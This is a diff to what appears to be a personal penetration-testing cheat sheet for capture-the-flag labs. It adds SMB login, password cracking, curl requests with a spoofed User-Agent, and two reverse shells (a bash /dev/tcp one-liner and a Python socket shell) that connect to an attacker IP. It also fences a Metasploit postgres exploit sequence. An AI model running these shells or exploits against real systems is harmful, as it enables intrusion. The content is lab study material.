@@ -8,7 +8,14 @@
 
  nmap -A Target (Aggressive scan)
 
+#### Kali Commands
+sudo -l (To check all the permissions provided to the current user after using sudo command)
  
+curl -X POST http://165.227.106.113/post.php -d "username=admin&password=71urlkufpsdnlkadsf"
+
+curl -H "User-Agent: Sup3rS3cr3tAg3nt" http://165.227.106.113/header.php
+
+curl -H "User-Agent: Sup3rS3cr3tAg3nt" -H "Referer:awesomesauce.com" http://165.227.106.113/header.php
 
  #### Searchsploit
 
@@ -87,7 +94,7 @@ id , uname -a, python -c 'import pty:pty.spawn("/bin/bash")'
 
 #### Connect to SMB (View Shares)
 
-smbclient -L \\10.10.101.175
+smbclient -L \\10.10.101.175 or smbclient -L 10.10.101.175
 
 smbclient //10.10.101.175/anonymous
 
@@ -95,10 +102,23 @@ ls
 
 get log.txt
 
+smbclient //10.10.61.86/milesdyson -U milesdyson  (Login to smb)
+
 #### John The Ripper command
 
-john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 file
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 hash
 
+#### Reverse Shell
+```
+nc -lvp 8080
+
+bash -c 'bash -i >& /dev/tcp/10.10.210.158/8080 0>&1' (10.10.210.158 is attacker's ip and this line is executed in vuln. website)
+```
+```
+nc -lvp 1234
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.207.168”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]); (Python code for reverse shell)
+```
 
 #### Hydra Commands
 
@@ -115,14 +135,14 @@ echo "KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===" 
 
 
 ### Port  5432 (Postgres)
-
+```
 search postgres
 use **exploit/linux/postgres/postgres_payload**
 set RHOSTS ip
 set LHOST ip
 run
 sessions -u 1 or 2 or whichever
-
+```
 ### Port 5900 (VNC)
 
 use **auxiliary/scanner/vnc/vnc_login**
